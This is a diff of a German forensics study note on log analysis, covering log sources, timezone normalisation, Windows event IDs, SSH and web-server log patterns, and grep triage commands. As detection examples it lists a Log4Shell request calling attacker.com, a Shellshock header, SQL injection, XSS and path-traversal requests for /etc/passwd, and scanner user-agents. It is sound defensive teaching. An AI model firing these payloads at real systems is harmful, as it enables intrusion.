@@ -7,83 +7,443 @@
 <link rel="stylesheet" href="../style.css">
 </head>
 <body class="note-page">
+<aside id="sidebar">
+  <div class="sidebar-header">
+    <a href="../index.html" class="logo">DF <span>Field Notes</span></a>
+  </div>
+  <div class="search-box">
+    <input type="text" id="sidebarSearch" placeholder="Notizen durchsuchen..." autocomplete="off">
+    <div class="sb-search-results" id="sidebarSearchResults"></div>
+  </div>
+  <ul class="nav-list nav-home">
+    <li><a href="../index.html">Startseite</a></li>
+    <li><a href="../00-meta/glossary.html">Glossar (A-Z)</a></li>
+  </ul>
+  <ul class="nav-list">
+    <li><details><summary>Grundlagen (8)</summary><ul>
+      <li><a href="../01-grundlagen/zahlensysteme-und-kodierung.html">Zahlensysteme und Kodierung</a></li>
+      <li><a href="../01-grundlagen/rechnerarchitektur-von-neumann.html">Rechnerarchitektur</a></li>
+      <li><a href="../01-grundlagen/algorithmen-und-komplexitaet.html">Algorithmen und Komplexitaet</a></li>
+      <li><a href="../01-grundlagen/datenstrukturen.html">Datenstrukturen</a></li>
+      <li><a href="../01-grundlagen/programmierparadigmen.html">Programmierparadigmen</a></li>
+      <li><a href="../01-grundlagen/python-grundlagen.html">Python-Grundlagen</a></li>
+      <li><a href="../01-grundlagen/oop-klassen-vererbung.html">OOP: Klassen und Vererbung</a></li>
+      <li><a href="../01-grundlagen/softwareentwicklungsprozess.html">Softwareentwicklungsprozess</a></li>
+    </ul></details></li>
+    <li><details><summary>Betriebssysteme (15)</summary><ul>
+      <li><a href="../02-betriebssysteme/dateisysteme-uebersicht-fat-ntfs-ext4-apfs.html">Dateisysteme</a></li>
+      <li><a href="../02-betriebssysteme/betriebssystem-architekturen.html">BS-Architekturen</a></li>
+      <li><a href="../02-betriebssysteme/prozessmanagement-threads.html">Prozesse und Threads</a></li>
+      <li><a href="../02-betriebssysteme/memory-management.html">Memory Management</a></li>
+      <li><a href="../02-betriebssysteme/linux-administration.html">Linux-Administration</a></li>
+      <li><a href="../02-betriebssysteme/windows-administration.html">Windows-Administration</a></li>
+      <li><a href="../02-betriebssysteme/datentraeger-verschluesselung.html">Datentraeger-Verschluesselung</a></li>
+      <li><a href="../02-betriebssysteme/windows-registry-forensik.html">Registry Forensik</a></li>
+      <li><a href="../02-betriebssysteme/betriebssystem-forensik-spurensuche.html">Spurensuche</a></li>
+      <li><a href="../02-betriebssysteme/file-carving.html">File Carving</a></li>
+      <li><a href="../02-betriebssysteme/embedded-systems-iot-forensik.html">Embedded &amp; IoT</a></li>
+      <li><a href="../02-betriebssysteme/anti-forensik-betriebssystem.html">Anti-Forensik</a></li>
+      <li><a href="../02-betriebssysteme/mobile-forensik-android-ios.html">Mobile Forensik</a></li>
+      <li><a href="../02-betriebssysteme/container-docker-forensik.html">Container &amp; Docker</a></li>
+      <li><a href="../02-betriebssysteme/iot-security-grundlagen.html">IoT-Security</a></li>
+    </ul></details></li>
+    <li><details><summary>Netzwerke (12)</summary><ul>
+      <li><a href="../03-netzwerke/wireshark-basics-paketanalyse.html">Wireshark Basics</a></li>
+      <li><a href="../03-netzwerke/tcp-ip-protokollfamilie.html">TCP/IP</a></li>
+      <li><a href="../03-netzwerke/ip-adressierung-subnetting.html">IP &amp; Subnetting</a></li>
+      <li><a href="../03-netzwerke/routing-switching-vlans.html">Routing &amp; VLANs</a></li>
+      <li><a href="../03-netzwerke/dhcp-dns-arp.html">DHCP, DNS, ARP</a></li>
+      <li><a href="../03-netzwerke/vpn-und-firewalls.html">VPN &amp; Firewalls</a></li>
+      <li><a href="../03-netzwerke/netzwerkforensik-methoden.html">Netzwerkforensik</a></li>
+      <li><a href="../03-netzwerke/darknet-tor-i2p.html">Darknet &amp; Tor</a></li>
+      <li><a href="../03-netzwerke/web-sicherheit-owasp.html">Web &amp; OWASP</a></li>
+      <li><a href="../03-netzwerke/browser-forensik.html">Browser-Forensik</a></li>
+      <li><a href="../03-netzwerke/tls-ssl-forensik.html">TLS/SSL-Forensik</a></li>
+      <li><a href="../03-netzwerke/wireless-forensik.html">Wireless-Forensik</a></li>
+    </ul></details></li>
+    <li><details><summary>Forensik-Methoden (13)</summary><ul>
+      <li><a href="../04-forensik-methoden/forensischer-prozess-chain-of-custody.html">Prozess &amp; Chain of Custody</a></li>
+      <li><a href="../04-forensik-methoden/forensisches-imaging.html">Forensisches Imaging</a></li>
+      <li><a href="../04-forensik-methoden/write-blocker.html">Write-Blocker</a></li>
+      <li><a href="../04-forensik-methoden/datentraeger-forensik.html">Datentraeger-Forensik</a></li>
+      <li><a href="../04-forensik-methoden/arbeitsspeicher-forensik.html">Arbeitsspeicher (Memory)</a></li>
+      <li><a href="../04-forensik-methoden/logfile-analyse.html">Logfile-Analyse</a></li>
+      <li><a href="../04-forensik-methoden/triage-erstanalyse.html">Triage &amp; Erstanalyse</a></li>
+      <li><a href="../04-forensik-methoden/malware-analyse-statisch.html">Malware (Statisch)</a></li>
+      <li><a href="../04-forensik-methoden/malware-analyse-dynamisch.html">Malware (Dynamisch)</a></li>
+      <li><a href="../04-forensik-methoden/forensische-dokumentation.html">Dokumentation</a></li>
+      <li><a href="../04-forensik-methoden/datenbanken-forensik.html">Datenbanken</a></li>
+      <li><a href="../04-forensik-methoden/forensische-live-sicherung.html">Live-Sicherung</a></li>
+      <li><a href="../04-forensik-methoden/cloud-forensik.html">Cloud-Forensik</a></li>
+    </ul></details></li>
+    <li><details><summary>IT-Security (8)</summary><ul>
+      <li><a href="../05-it-security/schutzziele-cia-triad.html">Schutzziele (CIA)</a></li>
+      <li><a href="../05-it-security/risikoanalyse-threat-modeling.html">Risikoanalyse</a></li>
+      <li><a href="../05-it-security/kryptografie-grundlagen-symmetrisch-asymmetrisch.html">Kryptografie</a></li>
+      <li><a href="../05-it-security/authentifizierung-pki.html">Authentifizierung &amp; PKI</a></li>
+      <li><a href="../05-it-security/kryptoanalyse.html">Kryptoanalyse</a></li>
+      <li><a href="../05-it-security/post-quantum-blockchain.html">Post-Quantum &amp; Blockchain</a></li>
+      <li><a href="../05-it-security/security-incident-management.html">Incident Management</a></li>
+      <li><a href="../05-it-security/siem-und-monitoring.html">SIEM &amp; Monitoring</a></li>
+    </ul></details></li>
+    <li><details><summary>OSINT (5)</summary><ul>
+      <li><a href="../06-osint/osint-lifecycle-und-tooling.html">Lifecycle &amp; Tooling</a></li>
+      <li><a href="../06-osint/osint-recherche-methodik.html">Recherche-Methodik</a></li>
+      <li><a href="../06-osint/osint-anonymisierung-opsec.html">Anonymisierung &amp; OPSEC</a></li>
+      <li><a href="../06-osint/social-media-analyse.html">Social Media</a></li>
+      <li><a href="../06-osint/cybercrime-oekonomie.html">Cybercrime-Oekonomie</a></li>
+    </ul></details></li>
+    <li><details><summary>Recht &amp; Kriminalistik (9)</summary><ul>
+      <li><a href="../07-recht-kriminalistik/digitale-beweismittel-grundprinzipien.html">Digitale Beweismittel</a></li>
+      <li><a href="../07-recht-kriminalistik/strafrecht-allgemeiner-teil.html">Strafrecht AT</a></li>
+      <li><a href="../07-recht-kriminalistik/grundrechte-digital.html">Grundrechte</a></li>
+      <li><a href="../07-recht-kriminalistik/dsgvo-datenschutz.html">DSGVO</a></li>
+      <li><a href="../07-recht-kriminalistik/kriminalistik-grundlagen.html">Kriminalistik</a></li>
+      <li><a href="../07-recht-kriminalistik/tatortarbeit-spurenkunde.html">Tatort &amp; Spurenkunde</a></li>
+      <li><a href="../07-recht-kriminalistik/eingriffsrecht-tkue.html">Eingriffsrecht TKUe</a></li>
+      <li><a href="../07-recht-kriminalistik/ethik-informationssicherheit.html">Ethik</a></li>
+      <li><a href="../07-recht-kriminalistik/juristische-fallbearbeitung-gutachtenstil.html">Gutachtenstil</a></li>
+    </ul></details></li>
+    <li><details><summary>KI &amp; Forensik (5)</summary><ul>
+      <li><a href="../08-ki-forensik/llms-in-der-forensischen-analyse.html">LLMs in der Analyse</a></li>
+      <li><a href="../08-ki-forensik/ki-grundlagen-ml-overview.html">ML Overview</a></li>
+      <li><a href="../08-ki-forensik/neuronale-netze-deep-learning.html">Neuronale Netze</a></li>
+      <li><a href="../08-ki-forensik/decision-trees-klassifikation.html">Decision Trees</a></li>
+      <li><a href="../08-ki-forensik/bildforensik-objekterkennung.html">Bildforensik &amp; YOLO</a></li>
+    </ul></details></li>
+  </ul>
+  <ul class="nav-list">
+    <li><details><summary>Tools &amp; Referenzen</summary><ul>
+      <li><a href="../09-tools/ip-log-analyzer/README.html">IP Log Analyzer</a></li>
+      <li><a href="../09-tools/registry-parser/README.html">Registry Parser</a></li>
+      <li><a href="../00-meta/glossary.html">Glossar (A-Z)</a></li>
+      <li><a href="../INDEX.html">Themen-Index</a></li>
+      <li><a href="https://github.com/NicCsn/digital-forensics-notes">GitHub</a></li>
+    </ul></details></li>
+  </ul>
+</aside>
+<div class="note-wrapper">
 <nav class="top-nav">
   <a href="../index.html" class="home-link">DF Field Notes</a>
-  <span class="nav-crumb">/ <a href="../index.html">Forensik-Methoden</a> / Logfile-Analyse</span>
+  <span class="nav-crumb">/ <a href="../04-forensik-methoden/index.html">Forensik-Methoden</a> / Logfile-Analyse</span>
 </nav>
 <main>
 <article>
 <h1>Logfile-Analyse <span class="diff-badge diff-beginner">Grundlagen</span></h1>
-<details class="fold"><summary>Inhaltsverzeichnis</summary><ol><li><a href="#kurz-berblick">Kurzüberblick</a></li><li><a href="#details">Details</a></li><li><a href="#praktische-anwendung-befehle">Praktische Anwendung / Befehle</a></li><li><a href="#quellen-weiterf-hrendes">Quellen / Weiterführendes</a></li></ol></details>
+<details class="fold"><summary>Inhaltsverzeichnis</summary><ol><li><a href="#kurz-berblick">Kurzüberblick</a></li><li><a href="#log-quellen">Log-Quellen im DFIR</a></li><li><a href="#zeitnormalisierung">Zeitnormalisierung</a></li><li><a href="#eventlog-ids">Windows EventLog-IDs</a></li><li><a href="#linux-auth">Linux Auth Log Muster</a></li><li><a href="#apache-nginx">Apache/Nginx Log Analyse</a></li><li><a href="#log-grep">Log-Grep-Patterns für schnelle Triage</a></li><li><a href="#praktische-anwendung">Praktische Anwendung</a></li><li><a href="#quellen-weiterf-hrendes">Quellen / Weiterführendes</a></li></ol></details>
 
 <h2 id="kurz-berblick">Kurzüberblick</h2>
 
-<p>Logs sind das Gedächtnis eines Systems — sie protokollieren Ereignisse mit Zeitstempel. In der Forensik sind sie oft der rote Faden, der eine Angriffskette rekonstruiert: von der initialen Infektion über laterale Bewegung bis zur Exfiltration.</p>
+<p>Logs sind das Gedächtnis eines Systems — sie protokollieren Ereignisse mit Zeitstempel. In der Forensik sind sie oft der <strong>rote Faden</strong>, der eine Angriffskette rekonstruiert: von der initialen Infektion über laterale Bewegung bis zur Exfiltration. Ein einzelner Log-Eintrag mag unbedeutend erscheinen — die Korrelation mehrerer Log-Quellen über die Zeitachse ist das, was Fälle löst.</p>
 
-<h2 id="details">Details</h2>
+<div class="callout info"><strong>Grundsatz:</strong> Ein System ohne Logs ist ein Tatort ohne Zeugen. Je mehr Log-Quellen du hast, desto schwerer ist es für einen Angreifer, alle Spuren zu verwischen.</div>
 
-<h3>Wichtige Log-Quellen</h3>
+<h2 id="log-quellen">Log-Quellen im DFIR</h2>
+
+<h3>System-Logs</h3>
 
 <table class="styled-table">
-<thead><tr><th>System</th><th>Quelle</th><th>Inhalt</th></tr></thead><tbody>
-<tr><td>**Linux**</td><td>`/var/log/auth.log`</td><td>Login-Versuche, sudo, SSH-Sessions</td></tr>
-<tr><td>**Linux**</td><td>`/var/log/syslog`</td><td>Systemmeldungen, Kernel-Events</td></tr>
-<tr><td>**Linux**</td><td>`/var/log/apache2/access.log`</td><td>HTTP-Requests (Kombiniertes Log-Format)</td></tr>
-<tr><td>**Windows**</td><td>EventLog "Security"</td><td>Logins (4624/4625), Privilegien-Nutzung (4672)</td></tr>
-<tr><td>**Windows**</td><td>EventLog "System"</td><td>Dienst-Starts (7045/7036), System-Fehler</td></tr>
-<tr><td>**Windows**</td><td>EventLog "PowerShell Operational"</td><td>Ausgeführte PowerShell-Befehle (Event 4104)</td></tr>
-<tr><td>**Firewall**</td><td>Logs (varies)</td><td>Blockierte/erlaubte Verbindungen</td></tr>
-<tr><td>**Datenbank**</td><td>z.B. PostgreSQL `pg_log`</td><td>SQL-Statements, Connection-Versuche</td></tr>
+<thead><tr><th>System</th><th>Quelle</th><th>Typische Inhalte</th></tr></thead><tbody>
+<tr><td><strong>Linux</strong></td><td><code>/var/log/auth.log</code></td><td>SSH-Logins, sudo-Sessions, su-Wechsel, PAM-Events</td></tr>
+<tr><td><strong>Linux</strong></td><td><code>/var/log/syslog</code></td><td>Kernel-Events, Dienst-Start/Stop, Cron-Jobs, Hardware-Fehler</td></tr>
+<tr><td><strong>Linux</strong></td><td><code>/var/log/kern.log</code></td><td>Nur Kernel-Meldungen — USB-Einstecken, Treiber-Ladung, OOM-Killer</td></tr>
+<tr><td><strong>Linux</strong></td><td><code>journalctl</code> (systemd)</td><td>Zentrale systemd-Journal-Datenbank (binär, persistent oder flüchtig)</td></tr>
+<tr><td><strong>Windows</strong></td><td>EventLog "Security"</td><td>Login-Events, Rechte-Nutzung, Audit-Policy-Änderungen, Kerberos-Tickets</td></tr>
+<tr><td><strong>Windows</strong></td><td>EventLog "System"</td><td>Dienst-Start/Stop, Treiber-Ladung, System-Fehler, Hardware-Events</td></tr>
+<tr><td><strong>Windows</strong></td><td>EventLog "Application"</td><td>Applikations-Fehler, MSI-Installer, .NET-Laufzeitfehler</td></tr>
 </tbody></table>
 
-<h3>Standard-Log-Formate</h3>
+<h3>Netzwerk- und Server-Logs</h3>
 
-<p><strong>Syslog (RFC 5424):</strong></p>
-<pre><code>&lt;134&gt;1 2025-03-15T03:17:22.000Z myhost sshd 1234 - - Failed password for root from 203.0.113.42 port 54321 ssh2</code></pre>
-<ul><li>PRI (Facility + Severity), Timestamp, Hostname, App-Name, Message</li></ul>
+<table class="styled-table">
+<thead><tr><th>Quelle</th><th>Typisches Format</th><th>Forensischer Wert</th></tr></thead><tbody>
+<tr><td><strong>Apache access_log</strong></td><td>Combined Log Format</td><td>Web-Angriffe (SQLi, XSS, Path Traversal), Reconnaissance (404-Welle)</td></tr>
+<tr><td><strong>Apache error_log</strong></td><td>Freitext + Severity</td><td>Fehlgeschlagene Exploits, CGI/PHP-Fehler, ModSecurity-Alerts</td></tr>
+<tr><td><strong>Nginx access_log</strong></td><td>Combined (konfigurierbar)</td><td>Wie Apache, mit Upstream-Response-Time</td></tr>
+<tr><td><strong>SSH (sshd)</strong></td><td>Syslog / auth.log</td><td>Brute-Force-Angriffe, Public-Key-Auth, Port-Forwarding</td></tr>
+<tr><td><strong>Firewall (iptables, pfSense)</strong></td><td>Syslog</td><td>Blockierte/erlaubte Verbindungen, Port-Scans</td></tr>
+<tr><td><strong>DNS (BIND, dnsmasq)</strong></td><td>Query-Log</td><td>C2-Domains, DNS-Tunneling (lange TXT-Strings)</td></tr>
+<tr><td><strong>Datenbank (PostgreSQL, MySQL)</strong></td><td>Query-Log, Error-Log</td><td>SQL-Injection, Daten-Exfiltration, unautorisierte Zugriffe</td></tr>
+</tbody></table>
 
-<p><strong>Apache Combined Log Format:</strong></p>
-<pre><code>192.168.1.1 - frank [15/Mar/2025:03:17:22 +0200] &quot;GET /admin HTTP/1.1&quot; 403 1234 &quot;http://example.com&quot; &quot;Mozilla/5.0 ...&quot;</code></pre>
-<ul><li>IP, Ident, User, Timestamp, Request, Statuscode, Größe, Referer, User-Agent</li></ul>
+<h3>Anwendungs-Logs</h3>
+<ul>
+  <li><strong>PowerShell Operational:</strong> Event 4104 (Script-Block), Event 4103 (Pipeline-Ausführung)</li>
+  <li><strong>Sysmon:</strong> ProcessCreate (ID 1), NetworkConnect (ID 3), DriverLoad (ID 6) — extrem granular</li>
+  <li><strong>EDR/SIEM:</strong> CrowdStrike, SentinelOne, Splunk, Elastic — aggregierte und angereicherte Events</li>
+  <li><strong>Cloud:</strong> AWS CloudTrail, Azure Activity Log, GCP Audit Logs — API-Aufrufe, IAM-Änderungen</li>
+</ul>
 
-<h3>Zeitnormalisierung — das fundamentale Problem</h3>
+<h2 id="zeitnormalisierung">Zeitnormalisierung</h2>
 
-<ul><li>Logs aus verschiedenen Quellen haben verschiedene Zeitformate und Zeitzonen</li>
-<li><strong>Ohne Normalisierung ist keine Korrelation möglich</strong></li>
-<li>Lösung: Alle Zeitstempel auf UTC konvertieren, z.B. mit <code>dateutil.parser</code> + <code>pytz</code></li></ul>
+<p>Zeit ist das <strong>fundamentale Problem</strong> der Log-Analyse. Zwei Log-Einträge von verschiedenen Systemen lassen sich nur dann korrelieren, wenn ihre Zeitstempel auf dieselbe Zeitzone normalisiert sind.</p>
 
-<h3>Analyse-Patterns</h3>
+<h3>Zeitzonenfallen</h3>
 
-<p><strong>Brute-Force-Erkennung:</strong></p>
-<pre><code>cat auth.log | grep &quot;Failed password&quot; | awk &#x27;{print $NF}&#x27; | sort | uniq -c | sort -rn</code></pre>
-<p>→ IPs mit den meisten fehlgeschlagenen Logins</p>
+<table class="styled-table">
+<thead><tr><th>Quelle</th><th>Typisches Zeitformat</th><th>Zeitzonen-Problem</th></tr></thead><tbody>
+<tr><td>Linux syslog</td><td><code>Mar 15 03:17:22</code></td><td>Keine Zeitzone im String (nur System-Locale)</td></tr>
+<tr><td>Apache access.log</td><td><code>[15/Mar/2025:03:17:22 +0200]</code></td><td>Hat Zeitzone, Apache-eigener Format-String</td></tr>
+<tr><td>Windows EventLog</td><td>Intern UTC, Anzeige lokal</td><td>EventLog speichert UTC, wevtutil zeigt lokal</td></tr>
+<tr><td>Syslog (RFC 5424)</td><td><code>2025-03-15T03:17:22Z</code></td><td>ISO 8601 mit UTC-Marker — ideal!</td></tr>
+<tr><td>Firewall (pfSense)</td><td><code>Mar 15 03:17:22 PDT</code></td><td>Zeitzonen-Kürzel mehrdeutig (PDT ≠ PST)</td></tr>
+</tbody></table>
 
-<p><strong>Web-Angriffs-Erkennung:</strong></p>
-<pre><code>grep -E &quot;(UNION|SELECT|&lt;script|\.\./\.\./)&quot; access.log</code></pre>
-<p>→ SQLi, XSS, Path Traversal</p>
+<div class="callout danger"><strong>Sommerzeit-Falle:</strong> Ein Angriff findet am Tag der Zeitumstellung statt (z.B. 3:15 MESZ). Ein Server loggt in UTC (1:15), der andere in Lokalzeit (3:15). Ohne Normalisierung: 2 Stunden Differenz = inkorrekte Timeline = Angriffskette falsch rekonstruiert.</div>
 
-<p><strong>Zeitfenster-Analyse:</strong></p>
-<pre><code>grep &quot;2025-03-15 03:&quot; auth.log</code></pre>
-<p>→ Was geschah in der fraglichen Stunde?</p>
+<h3>Normalisierungsstrategie</h3>
+<ol>
+  <li><strong>Alle Zeitstempel nach UTC konvertieren.</strong> Keine Ausnahmen. UTC hat keine Sommerzeit, keinen TZ-Wechsel.</li>
+  <li><strong>Original-Zeitstempel behalten.</strong> Den UTC-konvertierten Wert <em>zusätzlich</em> speichern, nicht ersetzen.</li>
+  <li><strong>Zeitzone jeder Quelle dokumentieren:</strong> Welche TZ hatte das System? War Sommerzeit aktiv? NTP-Synchronisation?</li>
+</ol>
 
-<h3>Log-Integrität</h3>
+<pre><code># Python: Normalisierung verschiedener Formate nach UTC
+import dateutil.parser
+import pytz
 
-<ul><li>Logs können manipuliert werden → Verschlüsselte/Remote-Logs bevorzugen (Syslog-Server, SIEM)</li>
-<li><strong>Lücken:</strong> Fehlen erwartbare Log-Einträge? (z.B. kein Login nach Boot) → Verdacht auf Log-Wiping</li>
-<li><strong>Korrelation:</strong> FW-Log sagt "Verbindung erlaubt" + kein entsprechender Server-Log → verdächtig</li></ul>
+def normalize_to_utc(timestr, source_tz='UTC'):
+    dt = dateutil.parser.parse(timestr)
+    if dt.tzinfo is None:
+        dt = pytz.timezone(source_tz).localize(dt)
+    return dt.astimezone(pytz.UTC).isoformat()
 
-<h2 id="praktische-anwendung-befehle">Praktische Anwendung / Befehle</h2>
+print(normalize_to_utc('Mar 15 03:17:22', 'Europe/Berlin'))
+# → 2025-03-15T01:17:22+00:00 (CET = UTC+1)
 
-<ul><li><code>journalctl --since "2025-03-15 03:00" --until "2025-03-15 04:00"</code> — Linux-Journal filtern</li>
-<li><code>wevtutil qe Security /c:5 /rd:true /f:text</code> — letzte 5 EventLog-Einträge</li>
-<li><code>Get-WinEvent -LogName Security -MaxEvents 100 | Where-Object {$_.Id -eq 4625}</code> — PowerShell</li>
-<li><code>lnav /var/log/</code> — Terminal-basierter Log-Viewer mit Syntax-Highlighting</li></ul>
+print(normalize_to_utc('15/Mar/2025:03:17:22 +0200'))
+# → 2025-03-15T01:17:22+00:00 (+0200 = CEST)</code></pre>
+
+<h2 id="eventlog-ids">Windows EventLog-IDs — die wichtigsten für DFIR</h2>
+
+<table class="styled-table">
+<thead><tr><th>Event ID</th><th>Log</th><th>Bedeutung</th><th>Forensischer Hinweis</th></tr></thead><tbody>
+<tr><td><strong>4624</strong></td><td>Security</td><td>Erfolgreiche Anmeldung</td><td>LogonType 2 = interaktiv, 3 = Netzwerk, 10 = RemoteInteractive (RDP)</td></tr>
+<tr><td><strong>4625</strong></td><td>Security</td><td>Fehlgeschlagene Anmeldung</td><td>Brute-Force-Indikator. Status 0xC000006A = falsches Passwort</td></tr>
+<tr><td><strong>4688</strong></td><td>Security</td><td>Prozess-Erstellung</td><td>Muss per Audit-Policy aktiviert sein. Zeigt: <code>cmd.exe /c whoami</code>, <code>powershell -enc ...</code></td></tr>
+<tr><td><strong>7045</strong></td><td>System</td><td>Neuer Dienst installiert</td><td>Angreifer installieren Persistenz-Dienste. Service-Name + Binary-Path prüfen</td></tr>
+<tr><td><strong>7036</strong></td><td>System</td><td>Dienst gestartet/gestoppt</td><td>Monitor für "PSEXESVC" = PsExec-Nutzung</td></tr>
+<tr><td><strong>4720</strong></td><td>Security</td><td>Benutzerkonto erstellt</td><td>Angreifer legen persistente Accounts an ("helpdesk", "support")</td></tr>
+<tr><td><strong>4738</strong></td><td>Security</td><td>Benutzerkonto geändert</td><td>Passwort-Reset, Admin-Rechte eskaliert</td></tr>
+<tr><td><strong>1102</strong></td><td>Security</td><td>Audit-Log gelöscht</td><td>Log-Wiping! Protokolliert WER das Log gelöscht hat</td></tr>
+<tr><td><strong>4698</strong></td><td>Security</td><td>Scheduled Task erstellt</td><td>Persistenz über Aufgabenplanung</td></tr>
+<tr><td><strong>4104</strong></td><td>PowerShell Op.</td><td>PowerShell-Script-Block</td><td>Vollständiger PS-Code, inkl. Base64-dekodierter Payloads</td></tr>
+</tbody></table>
+
+<div class="callout warning"><strong>Voraussetzung:</strong> Viele Security-Events (4688, 4698) werden nur geloggt, wenn die entsprechende Audit-Policy aktiviert ist. Prüfen mit: <code>auditpol /get /category:*</code>. Ohne konfiguriertes Auditing siehst du NICHTS.</div>
+
+<h2 id="linux-auth">Linux Auth Log Muster</h2>
+
+<h3>Erfolgreiche SSH-Anmeldung</h3>
+<pre><code># Mit Passwort:
+sshd[1234]: Accepted password for root from 10.0.0.42 port 54321 ssh2
+
+# Mit Public-Key:
+sshd[1234]: Accepted publickey for ubuntu from 10.0.0.42 port 54321 ssh2: RSA SHA256:abc123...
+
+# Session-Start:
+sshd[1234]: Starting session: shell on pts/0 for root
+
+# Session-Ende:
+sshd[1234]: Received disconnect from 10.0.0.42 port 54321:11: disconnected by user</code></pre>
+
+<h3>Fehlgeschlagene SSH-Anmeldung (Brute-Force)</h3>
+<pre><code>sshd[1234]: Failed password for root from 203.0.113.42 port 54321 ssh2
+sshd[1234]: Failed password for root from 203.0.113.42 port 54322 ssh2
+sshd[1234]: Failed password for root from 203.0.113.42 port 54323 ssh2
+#              ... hunderte Einträge ...
+sshd[1234]: Accepted password for root from 203.0.113.42 port 54399 ssh2
+#     ^^^ ERFOLGREICH! Der Angreifer hat das Passwort erraten.</code></pre>
+
+<h3>Sudo-Sessions</h3>
+<pre><code>sudo:   frank : TTY=pts/0 ; PWD=/home/frank ; USER=root ; COMMAND=/usr/bin/nano /etc/shadow
+sudo:   frank : TTY=pts/0 ; PWD=/home/frank ; USER=root ; COMMAND=/usr/bin/apt install nmap</code></pre>
+
+<h3>Kritische Linux-Log-Patterns</h3>
+
+<table class="styled-table">
+<thead><tr><th>Pattern</th><th>Bedeutung</th><th>Dringlichkeit</th></tr></thead><tbody>
+<tr><td><code>Failed password for root</code></td><td>SSH-Brute-Force auf root</td><td>Mittel</td></tr>
+<tr><td><code>Accepted publickey for root</code></td><td>Root-Login per SSH-Key (ohne Passwort!)</td><td>Hoch — Wer hat den Key?</td></tr>
+<tr><td><code>session opened for user root by (uid=0)</code></td><td>Root-Sitzung via sudo/su</td><td>Hoch — Was wurde gemacht?</td></tr>
+<tr><td><code>authentication failure; ... rhost=</code></td><td>Generischer Auth-Fehler (PAM)</td><td>Mittel — Evtl. Teil eines Brute-Force</td></tr>
+<tr><td><code>pam_unix(sshd:auth): check pass; user unknown</code></td><td>Login-Versuch mit nicht-existentem User</td><td>Mittel — Name-Enumeration</td></tr>
+<tr><td><code>error: maximum authentication attempts exceeded</code></td><td>SSH-MaxAuthTries erreicht</td><td>Hoch — Aktiver Angriff</td></tr>
+</tbody></table>
+
+<h2 id="apache-nginx">Apache/Nginx Log Analyse</h2>
+
+<h3>Status-Code-Analyse</h3>
+
+<table class="styled-table">
+<thead><tr><th>HTTP-Code</th><th>Was es bedeutet</th><th>Forensische Interpretation</th></tr></thead><tbody>
+<tr><td><strong>200</strong></td><td>OK — Request erfolgreich</td><td>Normal. Aber: 200 auf ungewöhnliche URLs? (z.B. /wp-admin nach Brute-Force)</td></tr>
+<tr><td><strong>301/302</strong></td><td>Redirect</td><td>Kann auf offene Redirects hinweisen oder Teil eines Phishing-Angriffs sein</td></tr>
+<tr><td><strong>403</strong></td><td>Forbidden</td><td>Jemand versucht auf geschützte Ressourcen zuzugreifen</td></tr>
+<tr><td><strong>404</strong></td><td>Not Found</td><td><strong>Reconnaissance!</strong> Massenhaft 404s = Scanning (DirBuster, gobuster). Einzelne 404s = normal</td></tr>
+<tr><td><strong>500</strong></td><td>Internal Server Error</td><td><strong>Exploit-Versuche!</strong> Fehlgeschlagene SQLi/LFI/RFI verursachen Server-Fehler</td></tr>
+<tr><td><strong>502/503/504</strong></td><td>Bad Gateway / Unavailable</td><td>DDoS oder Server-Überlastung</td></tr>
+</tbody></table>
+
+<h3>Ungewöhnliche User-Agents</h3>
+
+<pre><code># Reconnaissance: Standard-Scanner erkennen
+nmap scripting engine
+Nikto
+sqlmap/1.0
+gobuster/3.0
+dirbuster
+
+# Exploit-Tools:
+Mozilla/5.0 (compatible; Googlebot/2.1)  # Fake Googlebot!
+python-requests/2.x
+curl/7.x
+wget/1.x
+
+# C2-Implants (exotische User-Agents):
+Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)  # Gefälscht
+() { :;}; /bin/bash -c "..."  # Shellshock-Angriff</code></pre>
+
+<h3>Typische URL-Angriffsmuster</h3>
+
+<pre><code># SQL-Injection
+GET /products.php?id=1' UNION SELECT
+GET /login.php?user=admin' OR '1'='1
+
+# Path Traversal
+GET /../../../../etc/passwd
+GET /download?file=../../../etc/shadow
+
+# XSS
+GET /search?q=&lt;script&gt;alert(1)
+
+# Log4Shell (2021)
+GET /${jndi:ldap://attacker.com/a}
+
+# WordPress-Brute-Force
+POST /wp-login.php  (hunderte Male mit verschiedenen Passwörtern)</code></pre>
+
+<h2 id="log-grep">Log-Grep-Patterns für schnelle Triage</h2>
+
+<h3>Top-Brute-Force-IPs (auth.log)</h3>
+<pre><code>grep "Failed password" auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -20</code></pre>
+
+<h3>Top-404-URLs (access.log) — Reconnaissance</h3>
+<pre><code>grep " 404 " access.log | awk '{print $7}' | sort | uniq -c | sort -rn | head -20</code></pre>
+
+<h3>SQL-Injection-Versuche</h3>
+<pre><code>grep -iE "(UNION.*SELECT|SELECT.*FROM|INSERT.*INTO|'.*OR.*'='|'.*--)" access.log</code></pre>
+
+<h3>XSS-Versuche</h3>
+<pre><code>grep -iE "(&lt;script|javascript:|onerror=|onload=)" access.log</code></pre>
+
+<h3>Path-Traversal</h3>
+<pre><code>grep -E "\.\./\.\." access.log</code></pre>
+
+<h3>Erfolgreiche Logins nach Fehlversuchen (evtl. erfolgreicher Brute-Force)</h3>
+<pre><code># Alle IPs, die erst Failed und dann Accepted hatten:
+grep "sshd" auth.log | grep -E "(Failed password|Accepted)" | \
+  awk '{print $(NF-3)}' | uniq -c | awk '$1 > 5'</code></pre>
+
+<h3>Zeitfenster-Isolation</h3>
+<pre><code># Alle Events zwischen 03:00 und 04:00 Uhr (am 15. März)
+grep "Mar 15 03:" auth.log
+
+# systemd-journal (Linux)
+journalctl --since "2025-03-15 03:00:00" --until "2025-03-15 04:00:00"</code></pre>
+
+<h3>Apache: Top-IPs nach Request-Volumen (DDoS/Scraping)</h3>
+<pre><code>awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -20</code></pre>
+
+<h2 id="praktische-anwendung">Praktische Anwendung</h2>
+
+<h3>Tool: lnav (Log Navigator)</h3>
+<pre><code># Interaktiver Log-Viewer mit automatischer Format-Erkennung
+lnav /var/log/apache2/access.log /var/log/auth.log
+# Syntax-Highlighting, Timeline-Ansicht, SQL-Abfragen auf Live-Logs</code></pre>
+
+<h3>Tool: LogParser (Windows)</h3>
+<pre><code># SQL-artige Abfragen auf EventLogs und CSV-Dateien
+LogParser.exe "SELECT TimeGenerated, EventID, Message
+  INTO report.csv
+  FROM Security.evtx
+  WHERE EventID IN (4624; 4625)
+  ORDER BY TimeGenerated DESC"</code></pre>
+
